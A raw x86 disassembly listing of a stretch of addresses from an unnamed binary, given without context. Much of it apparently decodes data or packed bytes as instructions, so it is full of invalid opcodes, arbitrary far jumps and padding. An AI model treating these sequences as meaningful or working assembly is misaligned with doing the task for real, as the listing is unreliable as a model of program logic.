  41d5b5:	dec    edi
  41d5b6:	ins    DWORD PTR es:[edi],dx
  41d5b7:	dec    esi
  41d5b8:	bound  ecx,QWORD PTR [esi+0x30]
  41d5bb:	dec    esi
  41d5bc:	scas   eax,DWORD PTR es:[edi]
  41d5bd:	dec    edi
  41d5be:	lods   eax,DWORD PTR ds:[esi]
  41d5bf:	dec    edi
  41d5c0:	lahf   
  41d5c1:	dec    edi
  41d5c2:	mov    ds:0x624e6d4f,al
  41d5c7:	dec    esi
  41d5c8:	xor    BYTE PTR [esi+0x0],cl
  41d5cb:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41d5d1:	dec    edi
  41d5d2:	test   eax,0xa04f934f
  41d5d7:	dec    edi
  41d5d8:	fwait
  41d5d9:	dec    edi
  41d5da:	xor    BYTE PTR [esi+0x0],cl
  41d5dd:	add    BYTE PTR [eax],al
  41d5df:	add    BYTE PTR [eax],al
  41d5e1:	add    BYTE PTR [eax],al
  41d5e3:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41d5ea:	mov    WORD PTR [ebp-0x32734274],gs
  41d5f0:	mov    ebp,ds
  41d5f2:	mov    ebp,gs
  41d5f4:	mov    ebp,?
  41d5f6:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41d5fc:	mov    WORD PTR ds:0x6d8c5d8c,?
  41d602:	mov    WORD PTR [edx-0x74],?
  41d605:	jae    0x41d593
  41d607:	jo     0x41d595
  41d609:	jno    0x41d597
  41d60b:	jbe    0x41d599
  41d60d:	ja     0x41d59b
  41d60f:	je     0x41d59d
  41d611:	jne    0x41d59f
  41d613:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41d61a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41d620:	lods   al,BYTE PTR ds:[esi]
  41d621:	jge    0x41d5df
  41d623:	jge    0x41d5c3
  41d625:	(bad)  
  41d626:	jns    0x41d69b
  41d628:	mov    ecx,0x7d738cb1
  41d62d:	ins    DWORD PTR es:[edi],dx
  41d62e:	enter  0x9fc6,0x26
  41d632:	jb     0x41d637
  41d634:	test   eax,0xb956bb17
  41d639:	hlt    
  41d63a:	test   al,0x37
  41d63c:	test   al,0x7e
  41d63e:	fnstenv [ecx-0x6a]
  41d641:	mov    cl,0x6a
  41d643:	push   0xffffffce
  41d645:	or     BYTE PTR [edx],bl
  41d647:	xlat   BYTE PTR ds:[ebx]
  41d648:	out    dx,eax
  41d649:	add    eax,0x9321d7aa
  41d64e:	scas   al,BYTE PTR es:[edi]
  41d64f:	adc    DWORD PTR [esi],esp
  41d651:	jge    0x41d676
  41d653:	fidiv  WORD PTR [edi]
  41d655:	leave  
  41d656:	hlt    
  41d657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d658:	cmp    ax,0x1fc8
  41d65c:	mov    dh,cl
  41d65e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d65f:	(bad)  
  41d660:	and    DWORD PTR [eax],ebx
  41d662:	and    DWORD PTR [ecx-0x18],esi
  41d665:	(bad)  [ebx+0x7]
  41d668:	cmc    
  41d669:	enter  0x301a,0x40
  41d66d:	adc    BYTE PTR [edx+0x0],al
  41d670:	jno    0x41d6d8
  41d672:	jp     0x41d6e2
  41d674:	fcom   st(4)
  41d676:	inc    ecx
  41d677:	add    BYTE PTR [edx*8-0x12f7ffbf],bh
  41d67e:	adc    al,BYTE PTR [edi]
  41d680:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41d687:	ins    BYTE PTR es:[edi],dx
  41d688:	push   0x49657557
  41d68d:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41d693:	push   edi
  41d694:	ins    BYTE PTR es:[edi],dx
  41d695:	inc    edx
  41d696:	push   0x76666a73
  41d69b:	inc    edx
  41d69c:	jo     0x41d6e7
  41d69e:	dec    ebp
  41d69f:	dec    ebp
  41d6a0:	pop    edx
  41d6a1:	jp     0x41d6fd
  41d6a3:	jbe    0x41d6eb
  41d6a5:	pop    ecx
  41d6a6:	jo     0x41d720
	...
  41d6bc:	inc    ebp
  41d6bd:	push   edx
  41d6be:	jb     0x41d734
  41d6c0:	inc    esi
  41d6c1:	je     0x41d704
  41d6c3:	inc    esi
  41d6c4:	jae    0x41d73c
  41d6c6:	dec    ebx
  41d6c7:	gs inc edx
  41d6c9:	inc    bx
  41d6cb:	push   ebp
  41d6cc:	jno    0x41d744
  41d6ce:	ja     0x41d737
  41d6d0:	dec    edi
  41d6d1:	dec    esp
  41d6d2:	dec    ebp
  41d6d3:	inc    edx
  41d6d4:	jno    0x41d747
  41d6d6:	jae    0x41d72b
  41d6d8:	dec    eax
  41d6d9:	inc    ebp
  41d6da:	inc    esp
  41d6db:	inc    esp
  41d6dc:	push   ecx
  41d6dd:	dec    edx
  41d6de:	ins    BYTE PTR es:[edi],dx
  41d6df:	dec    ebx
  41d6e0:	jbe    0x41d750
  41d6e2:	pop    eax
  41d6e3:	jbe    0x41d730
  41d6e5:	inc    ecx
  41d6e6:	fs gs jno 0x41d757
  41d6ea:	push   ebx
  41d6eb:	inc    ecx
  41d6ec:	add    BYTE PTR [eax],al
  41d6ee:	inc    ebx
  41d6ef:	outs   dx,BYTE PTR ds:[esi]
  41d6f0:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41d6f4:	push   edx
  41d6f5:	push   ecx
  41d6f6:	push   0x74000064
  41d6fb:	jne    0x41d772
  41d6fd:	ins    DWORD PTR es:[edi],dx
  41d6fe:	push   ecx
  41d6ff:	push   eax
  41d700:	jo     0x41d77c
  41d702:	addr16 jo 0x41d75b
  41d705:	pop    eax
  41d706:	add    BYTE PTR [eax],al
  41d708:	push   ecx
  41d709:	pop    ecx
  41d70a:	inc    ebx
  41d70b:	inc    edx
  41d70c:	outs   dx,BYTE PTR ds:[esi]
  41d70d:	popa   
  41d70e:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41d712:	jne    0x41d782
  41d714:	dec    ebx
  41d715:	add    BYTE PTR [ecx+0x45],bh
  41d718:	bound  ebp,QWORD PTR [ecx+0x46]
  41d71b:	dec    ecx
  41d71c:	ja     0x41d763
  41d71e:	dec    eax
  41d71f:	inc    ebp
  41d720:	inc    edx
  41d721:	push   ebx
  41d722:	add    BYTE PTR [eax],al
  41d724:	je     0x41d789
  41d726:	bound  esp,QWORD PTR [edi+0x78]
  41d729:	dec    eax
  41d72a:	bound  edx,QWORD PTR [ebx+0x43]
  41d72d:	pop    eax
  41d72e:	outs   dx,DWORD PTR ds:[esi]
  41d72f:	push   0x4355
  41d734:	inc    edi
  41d735:	gs ins BYTE PTR es:[edi],dx
  41d737:	dec    esp
  41d738:	js     0x41d7a2
  41d73a:	inc    edx
  41d73b:	js     0x41d783
  41d73d:	arpl   WORD PTR [eax],ax
  41d73f:	add    BYTE PTR [eax],al
  41d741:	add    BYTE PTR [eax],al
  41d743:	add    BYTE PTR [edx+0x70],cl
  41d746:	jb     0x41d7c0
  41d748:	outs   dx,DWORD PTR ds:[esi]
  41d749:	pop    eax
  41d74a:	dec    ebx
  41d74b:	push   esp
  41d74c:	dec    esp
  41d74d:	jns    0x41d79a
  41d74f:	js     0x41d7c9
  41d751:	outs   dx,BYTE PTR ds:[esi]
  41d752:	pop    ecx
  41d753:	jae    0x41d7c3
  41d755:	push   0x43644448
  41d75a:	arpl   WORD PTR [edx+0x55],sp
  41d75d:	push   0x42504e67
  41d762:	push   ebp
  41d763:	je     0x41d7da
  41d765:	addr16 dec edi
  41d767:	dec    esp
  41d768:	inc    edx
  41d769:	ins    DWORD PTR es:[edi],dx
  41d76a:	inc    esi
  41d76b:	inc    esi
  41d76c:	inc    esi
  41d76d:	arpl   WORD PTR [edx+0x47],bx
  41d770:	push   ebp
  41d771:	inc    ebx
  41d772:	popa   
  41d773:	push   edx
  41d774:	dec    esp
  41d775:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41d77c:	push   ecx
  41d77d:	push   ebx
  41d77e:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41d785:	dec    edx
  41d786:	jns    0x41d7f1
  41d788:	push   edx
  41d789:	inc    ebx
  41d78a:	jo     0x41d801
  41d78c:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41d790:	fs push ebx
  41d792:	inc    ebx
  41d793:	push   ebp
  41d794:	push   eax
  41d795:	ja     0x41d811
  41d797:	jp     0x41d7e6
  41d799:	push   esi
  41d79a:	arpl   WORD PTR gs:[ecx+0x45],si
  41d79e:	dec    edx
  41d79f:	dec    esi
  41d7a0:	data16 ja 0x41d7f1
  41d7a3:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41d7aa:	dec    esp
  41d7ab:	cmp    ebx,ebp
  41d7ad:	dec    esp
  41d7ae:	lods   eax,DWORD PTR ds:[esi]
  41d7af:	out    dx,al
  41d7b0:	mov    ebp,0xa53ddffb
  41d7b5:	js     0x41d770
  41d7b7:	pop    ds
  41d7b8:	and    BYTE PTR [ebx+0x1969456],dl
  41d7be:	add    BYTE PTR [ebp+0x3d000000],ch
  41d7c4:	(bad)  
  41d7c5:	jge    0x41d796
  41d7c7:	in     eax,0xe9
  41d7c9:	in     eax,dx
  41d7ca:	adc    al,0xf
  41d7cc:	xor    eax,0xe25f54c4
  41d7d1:	ffreep st(0)
  41d7d3:	(bad)
  41d7d6:	(bad)  
  41d7d7:	xor    BYTE PTR [edi-0x4f],ch
  41d7da:	jge    0x41d79e
  41d7dc:	mov    bh,0x4a
  41d7de:	sbb    BYTE PTR es:[edi],ah
  41d7e1:	mul    BYTE PTR [ebx-0x5da8cbf]
  41d7e7:	cmp    al,0x42
  41d7e9:	mov    ch,bh
  41d7eb:	out    dx,eax
  41d7ec:	std    
  41d7ed:	jmp    0x41d82a
  41d7ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7f0:	adc    al,BYTE PTR [eax+0x3]
  41d7f3:	cmp    dh,ch
  41d7f5:	mov    esi,0xa660925c
  41d7fa:	mov    BYTE PTR [edx],ah
  41d7fc:	and    al,0x56
  41d7fe:	adc    al,0x68
  41d800:	dec    esi
  41d801:	popf   
  41d802:	or     al,0xdd
  41d804:	jnp    0x41d844
  41d806:	mov    ah,0x6e
  41d808:	test   DWORD PTR [edx-0x6c142f7b],0xdcf3f71
  41d812:	int3   
  41d813:	push   ebx
  41d814:	shl    BYTE PTR [ecx-0xe],1
  41d817:	loopne 0x41d81c
  41d819:	cmp    DWORD PTR [edx-0x35],ebx
  41d81c:	push   es
  41d81d:	mov    ebx,0xc3422520
  41d822:	pop    eax
  41d823:	jecxz  0x41d832
  41d825:	cmp    ah,BYTE PTR [ebx+0xfe9cc5c]
  41d82b:	mov    edx,0x5c6d9903
  41d830:	(bad)  
  41d831:	xchg   ebx,eax
  41d832:	js     0x41d875
  41d834:	add    eax,0xe90e75cf
  41d839:	mov    DWORD PTR [edi+eiz*8-0x54],ebp
  41d83d:	xchg   ecx,eax
  41d83e:	js     0x41d8b4
  41d840:	in     al,0x89
  41d842:	inc    esp
  41d843:	(bad)  
  41d844:	ror    DWORD PTR [ebx-0x54],1
  41d847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d848:	shr    dh,1
  41d84a:	mov    al,0xa1
  41d84c:	and    DWORD PTR [esi],0xc
  41d84f:	icebp  
  41d850:	sub    ecx,ebx
  41d852:	jno    0x41d814
  41d854:	test   DWORD PTR [edx+esi*2-0x596a552b],esi
  41d85b:	xchg   BYTE PTR [eax-0x4c],cl
  41d85e:	sub    DWORD PTR [ecx],0xffffffab
  41d861:	inc    edx
  41d862:	jne    0x41d80e
  41d864:	jae    0x41d843
  41d866:	retf   
  41d867:	sub    BYTE PTR [ecx+edx*2+0x4ae3f718],ah
  41d86e:	out    dx,al
  41d86f:	leave  
	...
  41d878:	add    BYTE PTR [eax],al
  41d87a:	add    BYTE PTR [eax],ch
  41d87c:	mov    dl,0xa5
  41d87e:	push   edx
  41d87f:	mov    edi,0x7cfaff57
  41d884:	xlat   BYTE PTR fs:[ebx]
  41d886:	push   esi
  41d887:	ror    BYTE PTR [eax-0x68bea442],1
  41d88d:	add    DWORD PTR [eax],eax
  41d88f:	lods   eax,DWORD PTR ds:[esi]
  41d890:	add    BYTE PTR [eax],al
  41d892:	add    BYTE PTR [eax],bh
  41d894:	out    dx,eax
  41d895:	jmp    0x41d90b
  41d897:	retf   
  41d898:	(bad)  
  41d89a:	daa    
  41d89b:	bound  esp,QWORD PTR [edx+0x142cec1]
  41d8a1:	jns    0x41d880
  41d8a3:	call   0x11d0:0x2dfaf91c
  41d8aa:	mov    esi,0x417726d
  41d8af:	sahf   
  41d8b0:	jne    0x41d8e6
  41d8b2:	and    esi,esi
  41d8b4:	mov    fs,WORD PTR ds:0x7084f241
  41d8ba:	and    al,0xc6
  41d8bc:	jl     0x41d841
  41d8be:	mov    ds:0x3ad5d3f1,al
  41d8c3:	add    eax,0x55148e11
  41d8c8:	stos   BYTE PTR es:[edi],al
  41d8c9:	dec    edi
  41d8ca:	dec    eax
  41d8cb:	and    al,bh
  41d8cd:	pop    esp
  41d8ce:	gs sbb al,bh
  41d8d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8d2:	call   ecx
  41d8d4:	je     0x41d8f1
  41d8d6:	sbb    dh,bh
  41d8d8:	or     al,0xb7
  41d8da:	cmc    
  41d8db:	jge    0x41d8a8
  41d8dd:	addr16 jo 0x41d8db
  41d8e0:	inc    ebp
  41d8e1:	xchg   esp,eax
  41d8e2:	pop    esp
  41d8e3:	sbb    BYTE PTR [eax+edx*1],ch
  41d8e6:	adc    BYTE PTR [edx+0x34],0x80
  41d8ea:	mov    esi,0x120f8ff5
  41d8ef:	ret    0xdd4
  41d8f2:	mov    ch,0xd0
  41d8f4:	sbb    esp,DWORD PTR [ebp-0x57c664ca]
  41d8fa:	mov    ebx,DWORD PTR [eax]
  41d8fc:	jb     0x41d966
  41d8fe:	jne    0x41d897
  41d900:	mov    al,gs:0x2ebb951b
  41d906:	lods   eax,DWORD PTR ds:[esi]
  41d907:	jb     0x41d96f
  41d909:	gs mov ecx,0xc2f3b095
  41d90f:	dec    edi
  41d910:	cmp    al,0xe8
  41d912:	sahf   
  41d913:	pop    esp
  41d914:	scas   eax,DWORD PTR es:[edi]
  41d915:	push   ecx
  41d916:	jge    0x41d8c1
  41d918:	aas    
  41d919:	int    0x43
  41d91b:	or     dh,BYTE PTR [ebx]
  41d91d:	jo     0x41d8d1
  41d91f:	and    ecx,ebx
  41d921:	call   0x82617ba7
  41d926:	push   es
  41d927:	in     eax,dx
  41d928:	add    eax,0x1b6db35
  41d92d:	add    al,0x34
  41d92f:	add    DWORD PTR [edi],esi
  41d931:	ja     0x41d973
  41d933:	mov    bl,0x3
  41d935:	outs   dx,BYTE PTR ds:[esi]
  41d936:	into   
  41d937:	xchg   edx,eax
  41d938:	or     BYTE PTR [ecx],al
  41d93a:	gs mov al,0x3
  41d93d:	mov    BYTE PTR [esi],ch
  41d93f:	push   ecx
	...
  41d948:	add    BYTE PTR [eax],al
  41d94a:	add    BYTE PTR [ebx-0x7e80ab],dh
  41d950:	stos   DWORD PTR es:[edi],eax
  41d951:	push   DWORD PTR [edi-0x42]
  41d954:	xchg   esi,eax
  41d955:	push   0x85fa8857
  41d95a:	out    0xee,eax
  41d95c:	xchg   edi,eax
  41d95d:	add    DWORD PTR [eax],eax
  41d95f:	lods   eax,DWORD PTR ds:[esi]
  41d960:	add    BYTE PTR [eax],al
  41d962:	add    BYTE PTR [esi-0x4d],bh
  41d965:	mov    ah,0xaa
  41d967:	mov    ah,0x8b
  41d969:	xchg   esi,eax
  41d96a:	dec    esp
  41d96b:	add    DWORD PTR [esi+0x61],eax
  41d96e:	sbb    al,0xb5
  41d970:	cli    
  41d971:	xor    eax,0x59934dac
  41d976:	ss sub eax,0x3c08290c
  41d97c:	es jmp 0x5ee76623
  41d982:	dec    ebx
  41d983:	shl    DWORD PTR [ebx],cl
  41d985:	push   ebp
  41d986:	sbb    BYTE PTR [ebx+0x12],ch
  41d989:	add    ebx,0x2
  41d98c:	addr16 pop ss
  41d98e:	fst    DWORD PTR [esi-0x72029bdd]
  41d994:	xlat   BYTE PTR ds:[ebx]
  41d995:	mov    esi,0xdb5508dd
  41d99a:	fadd   st(3),st
  41d99c:	stos   DWORD PTR es:[edi],eax
  41d99d:	add    al,0xc5
  41d99f:	les    eax,FWORD PTR [edx-0x66]
  41d9a2:	hlt    
  41d9a3:	jbe    0x41d986
  41d9a5:	in     eax,0xa4
  41d9a7:	mov    ebp,0xe617456
  41d9ac:	clc    
  41d9ad:	dec    eax
  41d9ae:	sbb    eax,0x39b194bd
  41d9b3:	les    edi,FWORD PTR [ebp-0x1e47d0a9]
  41d9b9:	fwait
  41d9ba:	xchg   esp,eax
  41d9bb:	and    ch,BYTE PTR [edi+ebx*2-0x1dd0789]
  41d9c2:	push   esp
  41d9c3:	mov    edi,0x31702d01
  41d9c8:	mov    eax,0x87d1e7b1
  41d9cd:	sub    dl,BYTE PTR [eax+ebx*4-0x32ec794a]
  41d9d4:	jmp    0xd67e:0xb39ab6b1
  41d9db:	and    eax,0x6206d9ce
  41d9e0:	jecxz  0x41d970
  41d9e2:	int    0x82
  41d9e4:	mov    bl,0x8e
  41d9e6:	xor    ebp,edi
  41d9e8:	mov    ?,WORD PTR [edx-0x4b]
  41d9eb:	cmp    BYTE PTR [esi+edx*1-0x7f0e49f7],dl
  41d9f2:	fsubr  st,st(7)
  41d9f4:	jnp    0x41da19
  41d9f6:	js     0x41d981
  41d9f8:	js     0x41d9c1
  41d9fa:	jp     0x41d9b2
  41d9fc:	fcom   QWORD PTR [edx+0x5a209210]
  41da02:	mov    ds:0x33ebd84f,eax
  41da07:	xchg   ebx,eax
  41da08:	dec    ecx
  41da09:	leave  
  41da0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da0b:	imul   edi,ebx,0x6fc9ef
	...
  41da19:	add    BYTE PTR [eax],al
  41da1b:	cmp    dh,dl
  41da1d:	cmp    ah,BYTE PTR [esi+edi*8]
  41da20:	in     al,dx
  41da21:	fimul  WORD PTR ds:[edi+0xbac6bd5]
  41da28:	fsub   QWORD PTR [ecx]
  41da2a:	push   ebx
  41da2b:	fwait
  41da2c:	cwde   
  41da2d:	add    DWORD PTR [eax],eax
  41da2f:	lods   eax,DWORD PTR ds:[esi]
  41da30:	add    BYTE PTR [eax],al
  41da32:	add    BYTE PTR [esi],ah
  41da34:	pop    DWORD PTR [ecx-0x33de093]
  41da3a:	and    al,0xd
  41da3c:	or     al,0x68
  41da3e:	add    al,0x63
  41da40:	fmul   st,st(4)
  41da42:	test   BYTE PTR [eax-0x16],dl
  41da45:	cmp    bh,BYTE PTR [esi-0xe]
  41da48:	inc    esp
  41da49:	mov    WORD PTR ss:[ebx-0xf6d0141],?
  41da50:	mov    ch,0x11
  41da52:	in     al,0xd8
  41da54:	pop    esi
  41da55:	repnz lahf 
  41da57:	shl    ch,0x20
  41da5a:	jb     0x41da5a
  41da5c:	push   DWORD PTR [edx-0xe6cf043]
  41da62:	adc    eax,0x782cdaed
  41da67:	cmp    eax,ecx
  41da69:	shl    BYTE PTR [edi-0x43],0xf9
  41da6d:	ror    BYTE PTR [edi+esi*4+0x9],1
  41da71:	dec    ebx
  41da72:	xor    BYTE PTR [esi],0x7d
  41da75:	mov    dl,0x2a
  41da77:	jns    0x41d9ff
  41da79:	sbb    al,0x63
  41da7b:	adc    eax,0xc41bc9ba
  41da80:	push   edi
  41da81:	icebp  
  41da82:	scas   al,BYTE PTR es:[edi]
  41da83:	and    DWORD PTR [esi+0x5cdd7045],0x77
  41da8a:	aam    0xed
  41da8c:	mov    ds:0x85387c69,eax
  41da91:	dec    esp
  41da92:	and    esi,DWORD PTR [eax]
  41da94:	test   eax,0x7c9049d4
  41da99:	inc    edi
  41da9a:	mov    eax,ds:0xac245be3
  41da9f:	out    dx,al
  41daa0:	push   cs
  41daa1:	mov    ebx,0xb131ead5
  41daa6:	sahf   
  41daa7:	jno    0x41dacf
  41daa9:	lock fst st(5)
  41daac:	mov    bh,BYTE PTR [ecx+0x11ad9fea]
  41dab2:	jge    0x41db0d
  41dab4:	and    edi,DWORD PTR [ebp-0x3d8f99f7]
  41daba:	shr    DWORD PTR [edi-0x42018593],cl
  41dac0:	push   DWORD PTR [ebx+0x2bce4e8c]
  41dac6:	add    edx,esp
  41dac8:	sbb    edx,esp
  41daca:	inc    DWORD PTR [esp+edx*4]
  41dacd:	call   0x2493df3c
  41dad2:	xchg   edi,eax
  41dad3:	cli    
  41dad4:	shr    BYTE PTR ds:0xc360568e,cl
  41dada:	stc    
  41dadb:	mov    ecx,ebx
  41dadd:	dec    eax
  41dade:	xchg   edx,eax
  41dadf:	add    DWORD PTR [eax],0x0
  41dae5:	add    BYTE PTR [eax],al
  41dae7:	add    BYTE PTR [eax],al
  41dae9:	add    BYTE PTR [eax],al
  41daeb:	fnstenv [esi-0x2490e49a]
  41daf1:	std    
  41daf2:	neg    BYTE PTR [esi]
  41daf4:	sub    esp,DWORD PTR [ebx-0x23]
  41daf7:	jns    0x41da7e
  41daf9:	cs jg  0x41db44
  41dafc:	cdq    
  41dafd:	add    DWORD PTR [eax],eax
  41daff:	lods   eax,DWORD PTR ds:[esi]
  41db00:	add    BYTE PTR [eax],al
  41db02:	add    bh,al
  41db04:	jmp    0x73f9:0x6419ae78
  41db0b:	push   ebx
  41db0c:	je     0x41db48
  41db0e:	js     0x41dacb
  41db10:	test   al,0xd0
  41db12:	imul   ebp,DWORD PTR [ebx+edx*2-0x32],0xf054598d
  41db1a:	or     BYTE PTR [ecx+0x61a3bfe2],dh
  41db20:	cmp    ecx,ebx
  41db22:	scas   al,BYTE PTR es:[edi]
  41db23:	mov    esi,0x5519a7d9
  41db28:	scas   eax,DWORD PTR es:[edi]
  41db29:	gs int 0xaa
  41db2c:	jmp    0x41daed
  41db2e:	jo     0x41dab7
  41db30:	cmp    eax,0xc8f8a644
  41db35:	xchg   edx,eax
  41db36:	mov    ch,0x65
  41db38:	mov    ch,0xc6
  41db3a:	add    eax,0xe4a749b5
  41db3f:	and    al,0xa4
  41db41:	pop    esp
  41db42:	or     edi,DWORD PTR [edi]
  41db44:	mov    bl,0x2f
  41db46:	lods   al,BYTE PTR ds:[esi]
  41db47:	call   0x402d:0xa31ebe4d
  41db4e:	enter  0xf4d3,0x65
  41db52:	mov    eax,ds:0x89618f2b
  41db57:	sub    eax,0xce024c3d
  41db5c:	cmp    dh,BYTE PTR [ecx]
  41db5e:	add    DWORD PTR [ecx-0x3c],ecx
  41db61:	adc    DWORD PTR [eax],edx
  41db63:	xchg   esi,eax
  41db64:	daa    
  41db65:	jg     0x41dbc3
  41db67:	sub    ah,bl
  41db69:	cmp    esp,eax
  41db6b:	pop    eax
  41db6c:	jae    0x41db78
  41db6e:	mov    esi,0x68149570
  41db73:	xchg   edx,eax
  41db74:	pop    eax
  41db75:	sbb    ah,ah
  41db77:	adc    eax,0x9db7f76
  41db7c:	mov    ch,0xf3
  41db7e:	mov    eax,0x3a32a0f3
  41db83:	mov    DWORD PTR [edx+0x56],edx
  41db86:	ins    BYTE PTR es:[edi],dx
  41db87:	mov    bl,0x7c
  41db89:	stc    
  41db8a:	repz fimul WORD PTR ds:0xe7835572
  41db91:	jge    0x41dc01
  41db93:	mov    ds:0xecc9ac44,al
  41db98:	addr16 dec edi
  41db9a:	fdivr  st(0),st
  41db9c:	mov    ds:0x7e0cb906,al
  41dba1:	xor    ch,ah
  41dba3:	call   0x3d00:0x24b67449
  41dbaa:	movhps QWORD PTR [edi+0x64],xmm7
  41dbae:	(bad)  
  41dbaf:	jge    0x41dbb1
	...
  41dbb9:	add    BYTE PTR [eax],al
  41dbbb:	fidiv  DWORD PTR [edx]
  41dbbd:	xchg   edi,eax
  41dbbe:	mov    bh,bh
  41dbc0:	scas   eax,DWORD PTR es:[edi]
  41dbc1:	fbstp  TBYTE PTR [edx+0x3]
  41dbc4:	inc    ebp
  41dbc5:	mov    ds:0xf1ea6a5c,eax
  41dbca:	push   ebp
  41dbcb:	cmc    
  41dbcc:	cdq    
  41dbcd:	add    DWORD PTR [eax],eax
  41dbcf:	lods   eax,DWORD PTR ds:[esi]
  41dbd0:	add    BYTE PTR [eax],al
  41dbd2:	add    BYTE PTR [ecx+0x2e1d1d32],dh
  41dbd8:	cmp    bl,al
  41dbda:	(bad)  
  41dbdb:	rcl    cl,0xe8
  41dbde:	jae    0x41db7c
  41dbe0:	fistp  WORD PTR [ecx+0x7e]
  41dbe3:	xchg   ecx,eax
  41dbe4:	sub    BYTE PTR [ebx+0x7f],ch
  41dbe7:	ins    DWORD PTR es:[edi],dx
  41dbe8:	xchg   edx,edi
  41dbea:	stos   BYTE PTR es:[edi],al
  41dbeb:	adc    dh,BYTE PTR [edx+0x2cf55ca1]
  41dbf1:	mov    ebp,0xb2aae61e
  41dbf6:	sub    BYTE PTR [ebx-0x4b],dh
  41dbf9:	jmp    0xf118:0x5718ff9e
  41dc00:	push   edi
  41dc01:	jg     0x41dbe5
  41dc03:	in     al,dx
  41dc04:	in     al,0x51
  41dc06:	xor    al,0xa0
  41dc08:	adc    DWORD PTR [ebp+0x3f1fca65],esi
  41dc0e:	sbb    DWORD PTR [ebp-0x4c],ebp
  41dc11:	mov    DWORD PTR [ecx],esi
  41dc13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc14:	sar    al,cl
  41dc16:	out    dx,al
  41dc17:	mov    ah,0xf6
  41dc19:	or     dh,0x2b
  41dc1c:	pusha  
  41dc1d:	add    al,dh
  41dc1f:	mov    al,0xe7
  41dc21:	mov    ah,0x41
  41dc23:	jnp    0x41dc4e
  41dc25:	or     eax,0x7a76af98
  41dc2a:	test   eax,0x5945725
  41dc30:	add    al,0xf1
  41dc32:	xor    eax,ebx
  41dc34:	add    edi,DWORD PTR [edx]
  41dc36:	inc    esi
  41dc37:	or     bl,bl
  41dc39:	xchg   esi,eax
  41dc3a:	retf   0xc988
  41dc3d:	out    dx,al
  41dc3e:	mov    BYTE PTR [eax-0x3b],ah
  41dc41:	cs dec ebp
  41dc43:	sub    ch,BYTE PTR [edi+0x38]
  41dc46:	dec    ebp
  41dc47:	jo     0x41dc2e
  41dc49:	cmp    al,BYTE PTR [eax]
  41dc4b:	mov    ebp,0xb2e75211
  41dc50:	scas   eax,DWORD PTR es:[edi]
  41dc51:	push   cs
  41dc52:	push   ebp
  41dc53:	jno    0x41dbdf
  41dc55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc56:	ror    dh,cl
  41dc58:	shr    DWORD PTR [ebp-0x29],0x5f
  41dc5c:	jle    0x41dc8d
  41dc5e:	dec    ebx
  41dc5f:	mov    ds:0x5adce3ef,eax
  41dc64:	cld    
  41dc65:	ja     0x41dc9a
  41dc67:	popf   
  41dc68:	and    eax,0x26dbcc3a
  41dc6d:	fstp   QWORD PTR [edx]
  41dc6f:	inc    esp
  41dc70:	pusha  
  41dc71:	mov    ds:0x10dfa973,al
  41dc76:	cdq    
  41dc77:	mov    ebx,0x4eaf7077
  41dc7c:	leave  
  41dc7d:	aad    0xaf
  41dc7f:	lea    eax,[eax]
	...
  41dc89:	add    BYTE PTR [eax],al
  41dc8b:	dec    eax
  41dc8c:	in     al,0x3
  41dc8e:	fwait
  41dc8f:	scas   eax,DWORD PTR es:[edi]
  41dc90:	(bad)  
  41dc91:	fdiv   st,st(7)
  41dc93:	pop    esi
  41dc94:	sub    BYTE PTR [eax-0x10ee6271],bl
  41dc9a:	pop    ds
  41dc9b:	mov    ds:0xad00019a,al
  41dca0:	add    BYTE PTR [eax],al
  41dca2:	add    BYTE PTR [edx+ebx*1-0x4d799fa9],bl
  41dca9:	ins    DWORD PTR es:[edi],dx
  41dcaa:	in     al,0xbd
  41dcac:	aad    0xc8
  41dcae:	test   al,0x7a
  41dcb0:	aas    
  41dcb1:	pop    ecx
  41dcb2:	stc    
  41dcb3:	(bad)  
  41dcb4:	(bad)  
  41dcb5:	cli    
  41dcb6:	sbb    ch,bl
  41dcb8:	sbb    eax,0x32dbcd6b
  41dcbd:	add    BYTE PTR [edx+0x5c],al
  41dcc0:	xchg   ch,bh
  41dcc2:	dec    edi
  41dcc3:	mov    ebx,esi
  41dcc5:	jg     0x41dcac
  41dcc7:	and    BYTE PTR [edx-0x5cbd92bb],0xe4
  41dcce:	sub    BYTE PTR [ebx+0x69],ch
  41dcd1:	jecxz  0x41dcac
  41dcd3:	popf   
  41dcd4:	add    al,0x15
  41dcd6:	sub    edi,esi
  41dcd8:	sbb    eax,0xb3ba8886
  41dcdd:	stc    
  41dcde:	mov    edx,0xa6adbd94
  41dce3:	call   0x832d0b3a
  41dce8:	popf   
  41dce9:	mov    bl,0x8d
  41dceb:	pop    ecx
  41dcec:	xor    bh,BYTE PTR ds:0x3fec183c
  41dcf2:	imul   esp,edx,0x71
  41dcf5:	xor    BYTE PTR [edx],ch
  41dcf7:	idiv   DWORD PTR [eax-0x2b85344f]
  41dcfd:	in     al,dx
  41dcfe:	inc    esp
  41dcff:	jne    0x41dc85
  41dd01:	sbb    ebx,DWORD PTR [edi+0x2fd67885]
  41dd07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd08:	std    
  41dd09:	ss std 
  41dd0b:	pop    ds
  41dd0c:	(bad)  
  41dd0e:	adc    BYTE PTR [esi],dh
  41dd10:	mov    ?,WORD PTR [eax]
  41dd12:	stos   DWORD PTR es:[edi],eax
  41dd13:	out    0xf8,al
  41dd15:	mov    bh,BYTE PTR [ecx]
